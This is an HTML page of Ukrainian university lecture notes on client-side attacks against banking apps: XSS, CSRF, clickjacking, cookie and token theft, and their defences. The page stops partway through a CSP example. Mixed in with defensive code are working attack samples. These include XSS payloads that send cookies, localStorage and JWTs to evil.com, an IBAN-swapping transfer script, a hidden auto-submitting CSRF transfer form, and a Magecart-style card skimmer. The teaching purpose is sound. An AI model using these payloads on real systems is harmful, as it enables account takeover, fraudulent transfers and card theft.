<!DOCTYPE html>
<html lang="uk">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="Конспект лекції 4: Клієнтські атаки — XSS, CSRF, Clickjacking у фінансових системах.">
  <meta name="author" content="Кафедра ТЕІБ, Ужгородський національний університет">
  <meta name="theme-color" content="#0ea5e9">
  <title>Конспект: Лекція 4 — Фінансова Безпека</title>
  <link rel="icon" type="image/svg+xml" href="../../img/favicon.svg">
  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="../../css/style.css">
  <script>if(localStorage.getItem('theme')==='dark')document.documentElement.classList.add('dark')</script>
</head>
<body>

  <aside>
    <div class="logo">
      <div class="logo-icon">
        <svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
          <path d="M9 12l2 2 4-4"/>
        </svg>
      </div>
      <div class="logo-text">
        Фінансова<br>Безпека
        <span>онлайн-курс</span>
      </div>
    </div>

    <nav aria-label="Головна навігація">
      <a href="../../index.html" class="active">
        <span class="nav-icon" aria-hidden="true"><svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 19.5v-15A2.5 2.5 0 0 1 6.5 2H20v20H6.5a2.5 2.5 0 0 1 0-5H20"/></svg></span>
        Лекції
      </a>
      <a href="../../practicals.html">
        <span class="nav-icon" aria-hidden="true"><svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg></span>
        Практичні
      </a>
      <a href="../../tests.html">
        <span class="nav-icon" aria-hidden="true"><svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 11l3 3L22 4"/><path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"/></svg></span>
        Тести
      </a>
      <a href="../../materials.html">
        <span class="nav-icon" aria-hidden="true"><svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z"/><path d="M14 2v4a2 2 0 0 0 2 2h4"/></svg></span>
        Матеріали
      </a>
    </nav>

    <div class="sidebar-footer">
      <button class="theme-toggle" onclick="toggleTheme()" aria-label="Перемкнути тему">
        <svg id="theme-icon" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"/></svg>
        <span id="theme-label">Темна тема</span>
      </button>
    </div>
  </aside>

  <main>
    <div class="lecture-nav-top">
      <a href="../../lecture.html?id=4" class="back-link">&larr; Назад до лекції 4</a>
      <span class="lecture-badge">Конспект лекції 4</span>
    </div>

    <article class="lecture-content">
      <h1>Клієнтські атаки (XSS)</h1>
      <div class="lecture-info">
        <span>⏱ 2 год</span>
        <span class="badge badge-new">Конспект</span>
      </div>

      <!-- Section 4.1 -->
      <section>
        <h2>4.1 Міжсайтовий скриптинг (Cross-Site Scripting, XSS)</h2>

        <p>Міжсайтовий скриптинг (Cross-Site Scripting, XSS) — це тип вразливості, при якому зловмисник впроваджує шкідливий JavaScript-код у веб-сторінку, що виконується в браузері жертви. XSS стабільно входить до OWASP Top 10 і за даними HackerOne є найчастіше повідомлюваною вразливістю у bug bounty програмах. У фінансовому секторі наслідки XSS катастрофічні: крадіжка сесій інтернет-банкінгу, підміна реквізитів платежів, збір даних кредитних карток.</p>

        <p><strong>Три типи XSS:</strong></p>

        <p><strong>1. Reflected XSS (відображений)</strong> — шкідливий код передається через URL або параметри запиту та «відображається» у відповіді сервера без належної обробки. Жертва повинна перейти за спеціально сформованим посиланням.</p>
        <ul>
          <li>Приклад: пошук на сайті банку — користувач шукає <code>&lt;script&gt;document.location='https://evil.com/steal?c='+document.cookie&lt;/script&gt;</code>, і сервер вставляє цей рядок у сторінку результатів без екранування.</li>
          <li>Фінансовий контекст: зловмисник надсилає клієнту банку фішинговий лист з посиланням на легітимний домен банку, але з XSS-payload у параметрі. Жертва бачить правильний домен і довіряє посиланню.</li>
          <li>Вектор атаки: email-фішинг, месенджери, соціальні мережі, SMS з коротким посиланням.</li>
        </ul>

        <p><strong>2. Stored XSS (збережений)</strong> — найнебезпечніший тип. Шкідливий код зберігається на сервері (у базі даних, коментарях, профілях) та виконується у браузері кожного користувача, який переглядає заражену сторінку.</p>
        <ul>
          <li>Приклад у FinTech: зловмисник вставляє XSS-payload у поле «Призначення платежу» або «Ім'я отримувача». Коли оператор банку відкриває список транзакцій, скрипт виконується в його браузері з його привілеями.</li>
          <li>Реальний кейс: у 2019 році Stored XSS в онлайн-банкінгу дозволяв зловмиснику, який створив рахунок з шкідливим ім'ям, виконувати JavaScript у панелі адміністратора банку при перегляді списку клієнтів.</li>
          <li>Масштаб: одна вразливість може вразити тисячі користувачів без їхньої взаємодії.</li>
        </ul>

        <p><strong>3. XSS на основі DOM (DOM-based XSS)</strong> — шкідливий код виконується виключно на стороні клієнта через маніпуляцію об'єктної моделі документа (Document Object Model, DOM) без участі сервера. Вразливість знаходиться в клієнтському JavaScript-коді.</p>
        <ul>
          <li>Джерела (sources): <code>location.hash</code>, <code>location.search</code>, <code>document.referrer</code>, <code>window.name</code>, <code>postMessage</code>.</li>
          <li>Приймачі (sinks): <code>innerHTML</code>, <code>document.write()</code>, <code>eval()</code>, <code>setTimeout(string)</code>, <code>jQuery.html()</code>.</li>
          <li>Особливість: payload не передається на сервер (наприклад, через fragment #), тому серверні WAF та фільтри не можуть його виявити.</li>
          <li>Приклад у SPA-банкінгу: сучасні банківські додатки на React/Angular можуть бути вразливі через <code>dangerouslySetInnerHTML</code> або обхід Angular-санітайзера.</li>
        </ul>

        <p><strong>Контексти ін'єкції.</strong> Ефективний захист від XSS вимагає розуміння контексту, в який потрапляють дані: HTML body (потрібно HTML-encoding), HTML-атрибути (attribute encoding), JavaScript (JS encoding), URL (URL encoding), CSS (CSS encoding). Кожен контекст вимагає різного типу екранування — універсального захисту не існує.</p>

        <h3>Приклади XSS-payload для кожного типу</h3>
        <p><strong>Reflected XSS</strong> — зловмисник формує URL з payload у параметрі пошуку:</p>
        <pre><code>&lt;!-- Вразливий URL: https://bank.com/search?q=&lt;script&gt;...&lt;/script&gt; --&gt;

&lt;!-- Серверний код (PHP) — ВРАЗЛИВИЙ --&gt;
&lt;p&gt;Результати пошуку для: &lt;?php echo $_GET['q']; ?&gt;&lt;/p&gt;

&lt;!-- Payload у параметрі q: --&gt;
&lt;script&gt;
  // Крадіжка сесійного cookie інтернет-банкінгу
  new Image().src = 'https://evil.com/steal?cookie=' +
    encodeURIComponent(document.cookie);
&lt;/script&gt;</code></pre>

        <p><strong>Stored XSS</strong> — payload зберігається в базі даних через поле «Призначення платежу»:</p>
        <pre><code>&lt;!-- Зловмисник вводить у поле "Призначення платежу": --&gt;
Оплата послуг&lt;img src=x onerror="
  fetch('https://evil.com/exfil', {
    method: 'POST',
    body: JSON.stringify({
      cookies: document.cookie,
      url: location.href,
      localStorage: JSON.stringify(localStorage)
    })
  })
"&gt;

&lt;!-- Коли оператор банку переглядає транзакцію, скрипт виконується
     з його привілеями — можливий доступ до адмін-панелі --&gt;</code></pre>

        <p><strong>DOM-based XSS</strong> — вразливість у клієнтському JavaScript SPA-додатку банку:</p>
        <pre><code>// ВРАЗЛИВИЙ код банківського SPA
// URL: https://bank.com/dashboard#&lt;img src=x onerror=alert(1)&gt;

const section = location.hash.substring(1);
document.getElementById('content').innerHTML = section; // sink!

// Зловмисник надсилає посилання:
// https://bank.com/dashboard#&lt;img src=x onerror="
//   fetch('/api/transfer', {
//     method:'POST',
//     headers:{'Content-Type':'application/json'},
//     body: JSON.stringify({to:'UA1234567890',amount:50000})
//   })
// "&gt;</code></pre>

        <h3>Порівняння: вразливий vs захищений код</h3>
        <pre><code>// ❌ ВРАЗЛИВИЙ КОД — Node.js/Express
app.get('/search', (req, res) =&gt; {
  const query = req.query.q;
  res.send(`&lt;h2&gt;Результати для: ${query}&lt;/h2&gt;`); // Без екранування!
});

// ✅ ЗАХИЩЕНИЙ КОД — з output encoding
const escapeHtml = require('escape-html');

app.get('/search', (req, res) =&gt; {
  const query = escapeHtml(req.query.q);
  res.send(`&lt;h2&gt;Результати для: ${query}&lt;/h2&gt;`);
});
// &lt;script&gt; перетворюється на &amp;lt;script&amp;gt; — не виконується</code></pre>

        <h3>Реальний сценарій: XSS у фінансовому додатку</h3>
        <pre><code>// Сценарій: XSS у формі онлайн-переказу
// 1. Зловмисник знаходить Stored XSS у полі "Ім'я отримувача"
// 2. Payload перехоплює форму переказу та підміняє реквізити

// Шкідливий скрипт, що ін'єктується:
(function() {
  // Чекаємо завантаження форми переказу
  const observer = new MutationObserver(() =&gt; {
    const form = document.querySelector('#transfer-form');
    if (form) {
      form.addEventListener('submit', function(e) {
        e.preventDefault();
        // Підміна IBAN отримувача на рахунок зловмисника
        const ibanField = form.querySelector('[name="recipient_iban"]');
        ibanField.value = 'UA903052992990004149123456789';
        form.submit(); // Відправляємо з підміненими даними
      });
      observer.disconnect();
    }
  });
  observer.observe(document.body, { childList: true, subtree: true });
})();</code></pre>

        <div class="control-questions">
          <h3>Контрольні запитання</h3>
          <ol>
            <li>У чому принципова різниця між Reflected, Stored та DOM-based XSS з точки зору вектора доставки та масштабу ураження?</li>
            <li>Чому DOM-based XSS не може бути виявлений серверними WAF-системами, і які інструменти слід використовувати для його виявлення?</li>
            <li>Опишіть сценарій, при якому XSS у полі «Призначення платежу» може призвести до компрометації адміністратора банківської системи.</li>
            <li>Чому екранування повинно відбуватися при виводі (output), а не при введенні (input)? Наведіть приклад, коли input-валідація буде недостатньою.</li>
            <li>Яким чином зловмисник може використати XSS для підміни реквізитів банківського переказу в реальному часі?</li>
          </ol>
        </div>
      </section>

      <!-- Section 4.2 -->
      <section>
        <h2>4.2 CSRF та клікджекінг (Clickjacking)</h2>

        <p><strong>Підробка міжсайтових запитів (Cross-Site Request Forgery, CSRF)</strong> — атака, при якій зловмисник змушує браузер автентифікованого користувача надіслати небажаний запит до вразливого сайту. Браузер автоматично додає cookies (включаючи сесійні) до кожного запиту на домен, тому запит виглядає легітимним.</p>

        <p><strong>Сценарій атаки на інтернет-банкінг:</strong></p>
        <ol>
          <li>Клієнт авторизований в інтернет-банкінгу (сесійний cookie активний).</li>
          <li>Клієнт відвідує шкідливий сайт або відкриває email з HTML-вмістом.</li>
          <li>Шкідлива сторінка містить приховану форму, яка автоматично надсилає POST-запит на <code>bank.com/transfer</code> з параметрами: recipient=attacker&amount=10000.</li>
          <li>Браузер додає сесійний cookie банку до запиту. Банк бачить валідну сесію та виконує переказ.</li>
        </ol>

        <p><strong>Методи захисту від CSRF:</strong></p>
        <ul>
          <li><strong>CSRF-токен (шаблон синхронізатора, Synchronizer Token Pattern)</strong> — сервер генерує унікальний токен для кожної сесії або форми. Токен включається у приховане поле форми та перевіряється при отриманні запиту. Зловмисник не може отримати токен з іншого домену через Same-Origin Policy.</li>
          <li><strong>SameSite Cookies</strong> — атрибут <code>SameSite=Strict</code> забороняє відправку cookie з cross-site запитів. <code>SameSite=Lax</code> — компроміс, що дозволяє cookie лише для top-level навігації (GET). Для фінансових систем рекомендується Strict.</li>
          <li><strong>Подвійне надсилання cookie (Double Submit Cookie)</strong> — CSRF-токен зберігається в cookie та одночасно передається в тілі запиту або заголовку. Сервер порівнює обидва значення.</li>
          <li><strong>Власні заголовки запитів (Custom Request Headers)</strong> — AJAX-запити з власними заголовками (наприклад, X-Requested-With) не можуть бути надіслані між доменами без CORS preflight, що блокує CSRF.</li>
        </ul>

        <p><strong>Клікджекінг (Clickjacking, UI Redressing)</strong> — атака, при якій зловмисник накладає прозорий iframe з легітимним сайтом поверх шкідливої сторінки. Користувач думає, що натискає кнопку на сайті зловмисника, а насправді клікає на кнопку «Підтвердити переказ» у прихованому iframe банку.</p>
        <ul>
          <li><strong>Приклад у FinTech:</strong> зловмисник створює сторінку «Виграйте iPhone» з кнопкою «Забрати приз». За цією кнопкою прихований iframe з відкритою сторінкою банку та кнопкою «Підтвердити переказ на 50 000 грн».</li>
          <li><strong>Захист:</strong> HTTP-заголовок <code>X-Frame-Options: DENY</code> (або SAMEORIGIN) забороняє вбудовування сторінки в iframe. Сучасний підхід — директива <code>frame-ancestors</code> у Content Security Policy.</li>
          <li><strong>Лайкджекінг (Likejacking), курсорджекінг (Cursorjacking)</strong> — варіації клікджекінгу для підміни дій у соціальних мережах та маніпуляції курсором.</li>
        </ul>

        <h3>Приклад CSRF-атаки: прихована форма переказу коштів</h3>
        <pre><code>&lt;!-- Шкідлива HTML-сторінка зловмисника (evil.com) --&gt;
&lt;html&gt;
&lt;body&gt;
  &lt;h1&gt;Вітаємо! Ви виграли iPhone!&lt;/h1&gt;

  &lt;!-- Прихована форма, що автоматично відправляє переказ --&gt;
  &lt;form id="csrf-form" action="https://bank.com/api/transfer"
        method="POST" style="display:none"&gt;
    &lt;input name="recipient" value="UA903052992990004149123456789" /&gt;
    &lt;input name="amount" value="25000" /&gt;
    &lt;input name="currency" value="UAH" /&gt;
    &lt;input name="description" value="Поповнення рахунку" /&gt;
  &lt;/form&gt;

  &lt;script&gt;
    // Форма відправляється автоматично при завантаженні
    // Браузер додасть сесійний cookie банку до запиту
    document.getElementById('csrf-form').submit();
  &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>

        <h3>Реалізація захисту від CSRF: шаблон синхронізатора (Synchronizer Token Pattern)</h3>
        <pre><code>// Серверна частина — Node.js/Express з CSRF-захистом
const csrf = require('csurf');
const cookieParser = require('cookie-parser');

app.use(cookieParser());
const csrfProtection = csrf({ cookie: true });

// Генерація форми з CSRF-токеном
app.get('/transfer', csrfProtection, (req, res) =&gt; {
  res.render('transfer', { csrfToken: req.csrfToken() });
});

// Перевірка CSRF-токена при отриманні POST-запиту
app.post('/transfer', csrfProtection, (req, res) =&gt; {
  // Якщо токен невалідний — csurf автоматично поверне 403 Forbidden
  processTransfer(req.body);
  res.send('Переказ виконано');
});

// HTML-форма з прихованим CSRF-токеном
// &lt;form method="POST" action="/transfer"&gt;
//   &lt;input type="hidden" name="_csrf" value="{{csrfToken}}" /&gt;
//   &lt;input name="recipient" placeholder="IBAN отримувача" /&gt;
//   &lt;input name="amount" placeholder="Сума" /&gt;
//   &lt;button type="submit"&gt;Переказати&lt;/button&gt;
// &lt;/form&gt;</code></pre>

        <h3>Захист від клікджекінгу: X-Frame-Options та CSP frame-ancestors</h3>
        <pre><code># Налаштування HTTP-заголовків для захисту від Clickjacking

# Варіант 1: X-Frame-Options (класичний підхід)
# Повністю забороняє вбудовування в iframe
X-Frame-Options: DENY

# Дозволяє вбудовування лише з того самого домену
X-Frame-Options: SAMEORIGIN

# ---

# Варіант 2: CSP frame-ancestors (сучасний підхід, замінює X-Frame-Options)
# Повна заборона iframe
Content-Security-Policy: frame-ancestors 'none';

# Дозволити лише свій домен
Content-Security-Policy: frame-ancestors 'self';

# Дозволити конкретні довірені домени (наприклад, партнерський портал)
Content-Security-Policy: frame-ancestors 'self' https://partner.bank.com;

# ---

# Реалізація в Express.js:
# const helmet = require('helmet');
# app.use(helmet.frameguard({ action: 'deny' }));
#
# Або через CSP:
# app.use(helmet.contentSecurityPolicy({
#   directives: {
#     frameAncestors: ["'none'"]
#   }
# }));</code></pre>

        <h3>Захист cookie від CSRF: SameSite атрибут</h3>
        <pre><code># Налаштування cookie для фінансового додатку
Set-Cookie: sessionId=abc123;
  Secure;          # Лише через HTTPS
  HttpOnly;        # Недоступний з JavaScript
  SameSite=Strict; # Не відправляється у cross-site запитах
  Path=/;
  Domain=bank.com;
  Max-Age=1800     # 30 хвилин

# Порівняння SameSite значень:
# Strict  — cookie ніколи не надсилається cross-site (максимальний захист)
# Lax     — cookie надсилається лише при top-level GET-навігації
# None    — cookie надсилається завжди (потрібен Secure; вразливий до CSRF)</code></pre>

        <div class="control-questions">
          <h3>Контрольні запитання</h3>
          <ol>
            <li>Поясніть, чому браузер автоматично надсилає cookies при cross-site запитах, і яким чином це робить можливою CSRF-атаку на банківський переказ.</li>
            <li>Порівняйте шаблон синхронізатора (Synchronizer Token Pattern) та подвійне надсилання cookie (Double Submit Cookie) як методи захисту від CSRF. Які переваги та недоліки кожного підходу?</li>
            <li>У чому різниця між значеннями SameSite=Strict та SameSite=Lax? Чому для фінансових систем рекомендується Strict?</li>
            <li>Опишіть сценарій клікджекінг-атаки на сторінку підтвердження платежу. Як frame-ancestors у CSP запобігає цій атаці?</li>
            <li>Чому Custom Request Headers (наприклад, X-Requested-With) можуть слугувати захистом від CSRF для AJAX-запитів?</li>
          </ol>
        </div>
      </section>

      <!-- Section 4.3 -->
      <section>
        <h2>4.3 Атаки на клієнтське сховище</h2>

        <p>Сучасні веб-додатки зберігають значні обсяги даних на стороні клієнта: сесійні токени, JWT, персональні дані, кеш транзакцій. Кожен механізм зберігання має свої вразливості, які зловмисники активно експлуатують у фінансовому секторі.</p>

        <p><strong>Крадіжка cookies:</strong></p>
        <ul>
          <li><strong>Через XSS:</strong> класичний вектор — <code>document.cookie</code> відправляється на сервер зловмисника. Захист: атрибут <code>HttpOnly</code> забороняє доступ до cookie через JavaScript.</li>
          <li><strong>Через мережу:</strong> на незахищених HTTP-з'єднаннях cookies передаються у відкритому вигляді. Захист: атрибут <code>Secure</code> дозволяє передачу лише через HTTPS + HSTS (HTTP Strict Transport Security).</li>
          <li><strong>Підкидання cookie (Cookie Tossing):</strong> зловмисник встановлює cookie на батьківському домені, що перезаписує cookie піддомену. Актуально для банків з кількома піддоменами (online.bank.com, api.bank.com).</li>
        </ul>

        <p><strong>Проблеми localStorage та sessionStorage:</strong></p>
        <ul>
          <li>Доступні будь-якому JavaScript на сторінці — XSS дає повний доступ до всіх збережених даних.</li>
          <li>Немає атрибуту HttpOnly або аналогу — неможливо обмежити доступ з JS.</li>
          <li>localStorage зберігається безстроково, навіть після закриття браузера. JWT-токени у localStorage — це постійний ризик.</li>
          <li><strong>Рекомендація для FinTech:</strong> зберігати access token у пам'яті (JavaScript-змінна), refresh token — у HttpOnly cookie. Не використовувати localStorage для чутливих даних.</li>
        </ul>

        <p><strong>Викрадення сесії (Session Hijacking)</strong> — перехоплення або крадіжка сесійного ідентифікатора для отримання доступу до акаунту жертви:</p>
        <ul>
          <li><strong>Перехоплення сесії (Session Sniffing)</strong> — перехоплення ідентифікатора сесії через незашифрований трафік (WiFi у кафе).</li>
          <li><strong>Фіксація сесії (Session Fixation)</strong> — зловмисник встановлює відомий ідентифікатор сесії жертві до автентифікації, а після логіну жертви використовує цей ідентифікатор.</li>
          <li><strong>Міжсайтове включення скриптів (Cross-Site Script Inclusion, XSSI)</strong> — викрадення даних з JSON-відповідей через тег <code>&lt;script&gt;</code>, якщо відповідь є валідним JavaScript.</li>
        </ul>

        <p><strong>Формджекінг (Formjacking)</strong> — ін'єкція шкідливого JavaScript у платіжні форми для крадіжки даних кредитних карток у реальному часі. Група Magecart здійснила серію масштабних атак: British Airways (380 000 карток), Ticketmaster, Newegg. Зловмисники компрометують або сам сайт, або сторонній JavaScript-скрипт (CDN, аналітика, чат-віджет), який підключений до платіжної сторінки. Захист: перевірка цілісності підресурсів (Subresource Integrity, SRI), обмеження сторонніх скриптів через CSP, ізоляція платіжних сторінок.</p>

        <h3>Крадіжка cookies через XSS: payload та захист</h3>
        <pre><code>// ❌ XSS-payload для крадіжки cookies
// Зловмисник ін'єктує цей код через XSS-вразливість:
&lt;script&gt;
  // Спосіб 1: через Image (обходить деякі фільтри)
  new Image().src = 'https://evil.com/collect?c=' +
    encodeURIComponent(document.cookie);

  // Спосіб 2: через fetch (дозволяє POST великі об'єми даних)
  fetch('https://evil.com/collect', {
    method: 'POST',
    mode: 'no-cors',
    body: JSON.stringify({
      cookies: document.cookie,
      url: window.location.href,
      token: localStorage.getItem('jwt_token')
    })
  });
&lt;/script&gt;

// ✅ ЗАХИСТ: правильна конфігурація cookie
// Навіть при успішній XSS-атаці, HttpOnly cookie недоступні з JS
// document.cookie поверне порожній рядок для HttpOnly cookies</code></pre>

        <h3>Безпечна конфігурація cookies для фінансового додатку</h3>
        <pre><code>// Node.js/Express — налаштування безпечних cookies
const session = require('express-session');

app.use(session({
  name: 'bankSessionId',  // Не використовуйте стандартні імена (JSESSIONID, connect.sid)
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,    // ✅ Недоступний з JavaScript (захист від XSS-крадіжки)
    secure: true,      // ✅ Лише через HTTPS (захист від перехоплення в мережі)
    sameSite: 'strict', // ✅ Не надсилається cross-site (захист від CSRF)
    maxAge: 15 * 60 * 1000, // 15 хвилин — короткий час життя для банкінгу
    domain: '.bank.com',
    path: '/'
  }
}));

// Додатковий захист: HSTS для примусового HTTPS
app.use((req, res, next) =&gt; {
  res.setHeader('Strict-Transport-Security',
    'max-age=31536000; includeSubDomains; preload');
  next();
});</code></pre>

        <h3>localStorage vs sessionStorage: порівняння ризиків</h3>
        <pre><code>// ❌ НЕБЕЗПЕЧНО: зберігання токенів у localStorage
localStorage.setItem('access_token', 'eyJhbGciOiJIUzI1NiIs...');
localStorage.setItem('user_data', JSON.stringify({
  name: 'Іван Петренко',
  iban: 'UA903052992990004149123456789',
  balance: 125000
}));
// Проблема: XSS дає ПОВНИЙ доступ до всіх даних
// localStorage зберігається БЕЗСТРОКОВО навіть після закриття браузера

// ⚠️ sessionStorage — трохи краще, але все ще вразливий до XSS
sessionStorage.setItem('temp_token', 'eyJhbGciOiJIUzI1NiIs...');
// Видаляється при закритті вкладки, але XSS все одно має доступ

// ✅ РЕКОМЕНДОВАНИЙ підхід для фінансових додатків:
// 1. Access token — зберігати ЛИШЕ в пам'яті (JavaScript-змінна)
let accessToken = null; // Зникає при оновленні сторінки

// 2. Refresh token — у HttpOnly Secure cookie
// (встановлюється сервером, недоступний з JS)

// 3. При оновленні сторінки — silent refresh через refresh token cookie
async function silentRefresh() {
  const response = await fetch('/api/auth/refresh', {
    credentials: 'include' // Надсилає HttpOnly cookie
  });
  const data = await response.json();
  accessToken = data.access_token; // Зберігаємо лише в пам'яті
}

// Порівняльна таблиця:
// ┌──────────────────┬────────────┬────────────────┬───────────────┐
// │ Характеристика   │ Cookie     │ localStorage   │ sessionStorage│
// ├──────────────────┼────────────┼────────────────┼───────────────┤
// │ HttpOnly         │ ✅ Так     │ ❌ Ні          │ ❌ Ні         │
// │ Secure           │ ✅ Так     │ ❌ Ні          │ ❌ Ні         │
// │ SameSite         │ ✅ Так     │ ❌ Ні          │ ❌ Ні         │
// │ Доступ з JS      │ Блокується │ ✅ Завжди      │ ✅ Завжди     │
// │ Час зберігання   │ Гнучкий    │ Безстроково    │ До закриття   │
// │ Розмір           │ ~4 КБ      │ ~5-10 МБ       │ ~5-10 МБ      │
// │ Для фін. токенів │ ✅ Так     │ ❌ Ні          │ ❌ Ні         │
// └──────────────────┴────────────┴────────────────┴───────────────┘</code></pre>

        <h3>Формджекінг: приклад шкідливого скрипта Magecart</h3>
        <pre><code>// Спрощений приклад formjacking-скрипта (стиль Magecart)
// Цей код ін'єктується у скомпрометований сторонній JS-файл
// (наприклад, analytics.js або chat-widget.js)

(function() {
  // Чекаємо появу платіжної форми
  const observer = new MutationObserver(function() {
    const cardForm = document.querySelector('form[action*="payment"]') ||
                     document.querySelector('#payment-form');
    if (!cardForm) return;

    cardForm.addEventListener('submit', function(e) {
      // Збираємо дані кредитної картки
      const cardData = {
        number: cardForm.querySelector('[name="card_number"]').value,
        expiry: cardForm.querySelector('[name="expiry"]').value,
        cvv: cardForm.querySelector('[name="cvv"]').value,
        name: cardForm.querySelector('[name="cardholder"]').value
      };

      // Відправляємо на сервер зловмисника (через Image для обходу CSP)
      const exfilUrl = 'https://cdn-analytics.evil.com/collect.gif?' +
        btoa(JSON.stringify(cardData));
      new Image().src = exfilUrl;
      // Оригінальна форма продовжує працювати — жертва не помічає крадіжку
    });

    observer.disconnect();
  });

  observer.observe(document.body, { childList: true, subtree: true });
})();</code></pre>

        <div class="control-questions">
          <h3>Контрольні запитання</h3>
          <ol>
            <li>Чому зберігання JWT-токенів у localStorage вважається небезпечним для фінансових додатків, і який альтернативний підхід рекомендується?</li>
            <li>Поясніть, яким чином атрибути HttpOnly, Secure та SameSite захищають cookie від різних типів атак (XSS, MITM, CSRF відповідно).</li>
            <li>Що таке підкидання cookie (Cookie Tossing) і чому ця атака особливо небезпечна для банків з кількома піддоменами?</li>
            <li>Опишіть принцип роботи formjacking-атаки у стилі Magecart. Чому компрометація стороннього JavaScript-файлу є особливо ефективним вектором?</li>
            <li>Яка різниця між викраденням сесії (Session Hijacking), перехопленням сесії (Session Sniffing) та фіксацією сесії (Session Fixation)? Які заходи захисту ефективні проти кожного типу?</li>
          </ol>
        </div>
      </section>

      <!-- Section 4.4 -->
      <section>
        <h2>4.4 Захист від клієнтських атак</h2>

        <p>Ефективний захист від клієнтських атак вимагає багаторівневого підходу (глибокий захист, defense in depth): від правильного кодування виводу до суворих HTTP-заголовків безпеки та ізоляції критичних компонентів.</p>

        <p><strong>Політика безпеки контенту (Content Security Policy, CSP)</strong> — HTTP-заголовок, який вказує браузеру, звідки дозволено завантажувати ресурси. CSP є найпотужнішим інструментом захисту від XSS:</p>
        <ul>
          <li><strong>script-src</strong> — дозволяє виконання скриптів лише з визначених джерел. <code>script-src 'self'</code> дозволяє лише скрипти з того ж домену, блокуючи inline-скрипти та eval().</li>
          <li><strong>style-src</strong> — контроль завантаження CSS. Забороняє вбудовані стилі (inline styles), які можуть використовуватися для витоку даних через CSS-ін'єкцію.</li>
          <li><strong>connect-src</strong> — обмежує домени для AJAX-запитів та WebSocket. Запобігає відправці вкрадених даних на зовнішні сервери.</li>
          <li><strong>frame-ancestors</strong> — замінює X-Frame-Options, контролює вбудовування сторінки в iframe.</li>
          <li><strong>report-uri / report-to</strong> — браузер надсилає звіти про порушення CSP, що дозволяє виявляти атаки та помилки в політиці.</li>
          <li><strong>Сувора CSP:</strong> замість білого списку доменів використовувати підхід на основі nonce (<code>script-src 'nonce-random123'</code>) або на основі хешу. Білий список легко обходиться через JSONP-ендпоінти або обхід Angular-пісочниці на дозволених доменах.</li>
        </ul>

        <p><strong>Перевірка цілісності підресурсів (Subresource Integrity, SRI)</strong> — атрибут integrity на тегах <code>&lt;script&gt;</code> та <code>&lt;link&gt;</code>, що містить криптографічний хеш очікуваного вмісту. Якщо CDN скомпрометовано і скрипт змінено (як у випадку Magecart), браузер відмовиться його виконувати, бо хеш не збігається.</p>

        <p><strong>Екранування виводу (Output Encoding)</strong> — основний захист від XSS. Кожен контекст вимагає свого типу encoding:</p>
        <ul>
          <li>HTML context: <code>&lt;</code> → <code>&amp;lt;</code>, <code>&gt;</code> → <code>&amp;gt;</code>, <code>&amp;</code> → <code>&amp;amp;</code></li>
          <li>HTML attribute: додатково екрануються лапки та спеціальні символи</li>
          <li>JavaScript context: Unicode-escape для спеціальних символів</li>
          <li>URL context: percent-encoding для параметрів</li>
          <li><strong>Правило:</strong> екранувати при виводі (output), а не при введенні (input). Дані зберігаються у чистому вигляді, а екрануються відповідно до контексту, де відображаються.</li>
        </ul>

        <p><strong>Довірені типи (Trusted Types)</strong> — сучасний браузерний API, який запобігає XSS на основі DOM на рівні платформи. Довірені типи забороняють присвоєння рядків до небезпечних приймачів (sinks), таких як innerHTML та document.write, — дозволені лише «довірені» об'єкти, створені через явну санітизацію.</p>

        <p><strong>Комплекс заголовків безпеки (Secure Headers) для фінансового додатку:</strong></p>
        <ul>
          <li><code>Content-Security-Policy</code> — захист від XSS та data injection</li>
          <li><code>X-Content-Type-Options: nosniff</code> — запобігання MIME-sniffing</li>
          <li><code>X-Frame-Options: DENY</code> — захист від clickjacking</li>
          <li><code>Strict-Transport-Security</code> — примусовий HTTPS (HSTS)</li>
          <li><code>Referrer-Policy: strict-origin-when-cross-origin</code> — контроль витоку URL</li>
          <li><code>Permissions-Policy</code> — обмеження доступу до API браузера (камера, мікрофон, геолокація)</li>
        </ul>

        <h3>Політика безпеки контенту (CSP): сувора політика для банківського додатку</h3>
        <pre><code># CSP для банківського веб-додатку — nonce-based підхід
# Це найсуворіша та найбезпечніша конфігурація

Content-Security-Policy:
  default-src 'none';                          # За замовчуванням — все заблоковано
  script-src 'nonce-{random}' 'strict-dynamic'; # Скрипти лише з одноразовим nonce
  style-src 'self' 'nonce-{random}';           # Стилі лише свої + з nonce
  img-src 'self' data:;                        # Зображення лише свої
  font-src 'self';                             # Шрифти лише свої
  connect-src 'self' https://api.bank.com;     # AJAX лише до свого API
  frame-ancestors 'none';                      # Заборона вбудовування в iframe
  base-uri 'self';                             # Захист від base tag injection
  form-action 'self';                          # Форми відправляються лише на свій домен
  require-trusted-types-for 'script';          # Примусові Trusted Types
  report-uri /api/csp-report;                  # Звіти про порушення

# Використання nonce у HTML:
# &lt;script nonce="{random}"&gt;
#   // Цей скрипт виконається — nonce збігається
#   initBankingApp();
# &lt;/script&gt;
#
# &lt;script&gt;alert('XSS')&lt;/script&gt;
# // Цей скрипт ЗАБЛОКОВАНО — немає валідного nonce

# ---

# CSP у режимі Report-Only (для тестування перед впровадженням)
Content-Security-Policy-Report-Only:
  default-src 'self';
